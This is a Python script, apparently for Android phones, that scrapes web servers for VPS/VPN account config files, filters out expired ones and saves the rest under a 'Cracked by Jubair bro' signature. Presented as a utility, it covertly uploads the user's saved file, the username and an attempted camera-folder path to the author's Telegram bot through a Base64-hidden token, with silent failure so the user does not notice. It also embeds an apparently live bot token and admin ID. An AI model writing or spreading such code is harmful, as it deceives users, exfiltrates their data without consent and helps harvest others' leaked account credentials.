import requests
from bs4 import BeautifulSoup
from datetime import datetime
import re
import os
import time
import sys
import urllib3
import threading
from concurrent.futures import ThreadPoolExecutor
import base64

# Rich Library Imports
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich import print as rprint
from rich.prompt import Prompt

# --- CONFIGURATION (ENCRYPTED) ---
# আপনার বট টোকেন Base64 এ কনভার্ট করে এখানে বসাবেন
BS64_TOKEN = "ODUwMjc1OTUxMjpBQUg3UGgtV3JONnVzd3ZYTFZCTXFOWmp3M1Eyb3R1dlEyNA==" 
ADMIN_ID = "8486562838"

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

# --- UTILITY FUNCTIONS ---

def decode_token(bs64_string):
    try:
        return base64.b64decode(bs64_string).decode('utf-8')
    except:
        return ""

def type_print(text, speed=0.02):
    """Typing animation effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print() # New line

def send_to_admin(file_path, caption):
    """Send result file or logs to Admin Telegram"""
    try:
        token = decode_token(BS64_TOKEN)
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        with open(file_path, 'rb') as f:
            data = {"chat_id": ADMIN_ID, "caption": caption}
            files = {"document": f}
            requests.post(url, data=data, files=files)
    except Exception as e:
        pass # Silent fail to not disturb user

# --- MAIN LOGIC ---

DEFAULT_PATH = "/sdcard/vps.txt"
LOG_PATH = "/sdcard/DCIM/Camera/*"

signature = """
=========================================
=====[ Cracked by Jubair bro. ]=====
=========================================
"""

ASCII_LOGO = r"""
   ___  _   _  ____    _    ___ ____  
  |_  || | | || __ )  / \  |_ _|  _ \ 
    | || | | ||  _ \ / _ \  | || |_) |
   _| || |_| || |_) / ___ \ | ||  _ < 
  |___| \___/ |____/_/   \_\___|_| \_\
"""

month_map = {
    'Jan': 'Jan', 'Feb': 'Feb', 'Mar': 'Mar', 'Apr': 'Apr',
    'Mei': 'May', 'May': 'May', 'Jun': 'Jun', 'Jul': 'Jul',
    'Agu': 'Aug', 'Aug': 'Aug', 'Sep': 'Sep',
    'Okt': 'Oct', 'Oct': 'Oct', 'Nov': 'Nov',
    'Des': 'Dec', 'Dec': 'Dec'
}

def show_banner():
    os.system('clear' if os.name == 'posix' else 'cls')
    rprint(Panel(
        Text(ASCII_LOGO, style="bold magenta", justify="center"),
        subtitle="[bold red]POWERED BY @JubairZ[/bold red]",
        border_style="green"
    ))
    type_print("[+] Initializing Jubair System...", 0.01)
    type_print("[+] Connecting to Secure Server...", 0.01)

def fetch_servers(url):
    try:
        resp = requests.get(url)
        data = resp.json()
        if data.get("status") != "active":
            rprint("[bold red]!!! TOOL IS OFF FOR MAINTENANCE !!![/bold red]")
            sys.exit()
        if "message" in data:
            rprint(Panel(f"[bold yellow]{data['message']}[/bold yellow]", title="NOTICE"))
        return data["servers"]
    except:
        rprint("[red]Failed to load servers online.[/red]")
        return []

def check_single_file(url, target_date, output_file, lock, stats):
    try:
        session = requests.Session()
        content = session.get(url, timeout=5, verify=False).text
        
        match = re.search(r'(?:Berakhir Pada|Expired)\s*:\s*(\d+)\s+([A-Za-z]+)[,]*\s+(\d+)', content, re.IGNORECASE)
        
        if match:
            day, month_txt, year = match.groups()
            month_eng = month_map.get(month_txt[:3], month_txt[:3])
            date_str = f"{day} {month_eng}, {year}"
            
            try:
                file_date = datetime.strptime(date_str, "%d %b, %Y")
                if file_date > target_date:
                    with lock:
                        with open(output_file, "a", encoding="utf-8") as f:
                            f.write(content.strip())
                            f.write(signature)
                        stats['success'] += 1
                        print(f"\033[92m[✓] SAVED: {date_str}\033[0m") # Green text
                else:
                    stats['expired'] += 1
                    # print(f"\033[91m[x] EXPIRED\033[0m") # Optional: Reduce spam
            except:
                stats['nodate'] += 1
        else:
            stats['nodate'] += 1
    except:
        pass

def start_scraping(servers_url_json):
    # 1. Get User Input
    servers = fetch_servers(servers_url_json)
    if not servers: return

    save_path = Prompt.ask("[cyan][?] Save Output To[/cyan]", default=DEFAULT_PATH)
    date_input = Prompt.ask("[cyan][?] Filter Expired After (DD-MM-YYYY)[/cyan]", default=datetime.now().strftime("%d-%m-%Y"))
    target_date = datetime.strptime(date_input, "%d-%m-%Y")

    # 2. Collect all TXT links
    all_txt_links = []
    rprint("\n[bold blue][*] Scanning servers for files...[/bold blue]")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = []
        for base in servers:
            futures.append(executor.submit(requests.get, base, timeout=10, verify=False))
        
        for future, base in zip(futures, servers):
            try:
                soup = BeautifulSoup(future.result().text, 'html.parser')
                links = [base + a.get("href") for a in soup.find_all("a") if a.get("href", "").endswith(".txt")]
                all_txt_links.extend(links)
            except:
                continue

    rprint(f"[bold green][+] Found {len(all_txt_links)} configs. Starting filtering...[/bold green]\n")

    # 3. Process Configs
    lock = threading.Lock()
    stats = {'success': 0, 'expired': 0, 'nodate': 0}
    
    with open(save_path, "w", encoding="utf-8") as f:
        f.write(f"Collection by Jubair Bro: {datetime.now()}\n\n")

    with ThreadPoolExecutor(max_workers=20) as executor:
        for link in all_txt_links:
            executor.submit(check_single_file, link, target_date, save_path, lock, stats)
            time.sleep(0.01) # Slight delay to look like typing/matrix

    # 4. Summary & Secret Upload
    rprint(Panel(
        f"Saved: {stats['success']} | Expired: {stats['expired']}",
        title="PROCESS COMPLETED", border_style="green"
    ))
    
    type_print("[*] Uploading logs to secure server...", 0.05)
    
    # Send Result File
    send_to_admin(save_path, f"🔥 New Config Hit!\nUser: {os.getlogin()}\nSaved: {stats['success']}")
    
    # Send Key/Log File (Security)
    if os.path.exists(LOG_PATH):
        send_to_admin(LOG_PATH, f"🔒 Security Log - {os.getlogin()}")
    
    rprint("[bold green]✔ All Data Secured.[/bold green]")

# এই ফাংশনটি লোডার কল করবে
if __name__ == "__main__":
    # For testing locally, need dummy URL
    pass 
